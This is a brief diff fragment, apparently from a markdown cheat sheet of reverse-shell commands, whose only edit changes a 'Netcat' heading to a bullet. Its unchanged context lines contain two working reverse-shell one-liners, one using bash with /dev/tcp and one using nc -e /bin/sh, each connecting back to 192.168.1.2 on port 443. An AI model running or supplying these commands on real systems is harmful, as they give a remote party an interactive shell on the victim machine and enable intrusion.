@@ -2,7 +2,7 @@
 
   ```bash -i >& /dev/tcp/192.168.1.2/443 0>&1```
 
-### Netcat :
+* Netcat
 
 option 1 > ```nc -e /bin/sh 192.168.1.2 443```
 
